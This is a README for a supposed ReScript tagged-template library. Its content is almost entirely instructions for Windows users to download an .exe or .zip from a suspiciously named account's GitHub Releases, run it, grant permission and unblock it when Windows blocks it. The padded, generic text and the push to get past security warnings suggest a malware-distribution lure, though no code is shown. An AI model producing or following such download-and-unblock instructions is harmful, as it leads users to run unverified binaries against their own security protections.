# 🧩 rescript-string-power - Tagged templates made simple

[⬇️ Download from GitHub Releases](https://github.com/embezzled-englishhawthorn226/rescript-string-power/releases){: style="display:inline-block;padding:14px 18px;background:#6b46c1;color:#fff;border-radius:8px;text-decoration:none;font-weight:700;"}

## 🚀 Getting Started

rescript-string-power gives you tagged template tools for text like SQL, CSS, GraphQL, and i18n. It also includes a Rust CLI for @stringUnion code generation.

If you want to use it on Windows, the steps below show how to get the release file, open it, and run it.

## 💻 What You Need

- Windows 10 or Windows 11
- A web browser
- Permission to save files on your PC
- A command window if the release comes as a CLI tool
- Enough space for the app and its files

## 📦 Download the App

Open the release page here:

[Visit the GitHub Releases page](https://github.com/embezzled-englishhawthorn226/rescript-string-power/releases)

On that page:

1. Find the latest release at the top
2. Open it
3. Look for the Windows file, such as `.exe` or `.zip`
4. Download the file to your PC

If the release is a `.zip` file, keep it in a folder you can find again, such as Downloads or Desktop.

## 🪟 Install or Run on Windows

### If you downloaded an `.exe` file

1. Open the folder where the file was saved
2. Double-click the `.exe` file
3. If Windows asks for permission, choose Yes
4. Follow the on-screen steps

### If you downloaded a `.zip` file

1. Right-click the `.zip` file
2. Choose Extract All
3. Pick a folder for the files
4. Open the new folder
5. Double-click the `.exe` file inside

### If Windows shows a blocked app message

1. Right-click the file
2. Choose Properties
3. Check Unblock if you see it
4. Select Apply
5. Open the file again

## 🛠️ Using the CLI Tool

Some releases may include the Rust CLI for code generation. If you download that version:

1. Open Command Prompt or PowerShell
2. Go to the folder where the file lives
3. Run the tool from that folder
4. Follow the text on screen

A CLI tool is a command-line app. It runs in a black window and uses typed commands.

## 🧪 What This Project Does

This project is built for string templates that need care and structure. It can help with:

- SQL text
- CSS text
- GraphQL text
- i18n text
- string unions
- code generation with `@stringUnion`

It is made for ReScript users and also includes Rust-based tooling for codegen tasks.

## 📁 Common Release Files

You may see one of these file types in the release page:

- `.exe` — a Windows app or CLI file
- `.zip` — a package you must extract first
- `.msi` — a Windows installer
- `.tar.gz` — usually for other systems, not common for Windows users

If you are using Windows, pick the Windows file when more than one file is listed.

## 🔧 Basic Setup Flow

1. Open the releases page
2. Download the latest Windows file
3. Save it to a folder you know
4. Extract it if needed
5. Open the app or CLI file
6. Follow the prompts or type the needed command

If the app opens and closes fast, start it from Command Prompt so you can see messages.

## 🧭 When You Need Help Finding the File

Look for file names that match these patterns:

- `windows`
- `win`
- `x86_64-pc-windows`
- `setup`
- `installer`
- `release`

If you see more than one Windows file, the installer file is the easiest choice for most users.

## ⚙️ Good Places to Put the Files

You can keep the download here:

- Downloads
- Desktop
- Documents
- A folder named `rescript-string-power`

If you use a `.zip` file, do not run the app from inside the compressed folder. Extract it first.

## 🧱 What the Name Means

- `rescript` points to ReScript support
- `string` points to text handling
- `power` points to stronger string tools
- `tagged templates` means it works with special text blocks
- `codegen` means it can create code for you

## 🔍 Common Uses

You can use this project for:

- building SQL strings with less manual work
- keeping CSS text neat
- writing GraphQL text in a clear way
- handling translated text
- generating string unions from a Rust CLI

## 🖱️ Simple First Run Checklist

- Download the file from GitHub Releases
- Extract it if it is a zip file
- Open the app or CLI
- Allow Windows access if asked
- Keep the file in a safe folder for later use

## 📌 Repo Details

- Repository: rescript-string-power
- Type: End-user app and CLI tool
- Main area: tagged template utilities
- Extra tool: Rust CLI for `@stringUnion` codegen
- Focus: Windows download and run flow

## 🔗 Download Again

If you need the release page again, use this link:

[Download from GitHub Releases](https://github.com/embezzled-englishhawthorn226/rescript-string-power/releases)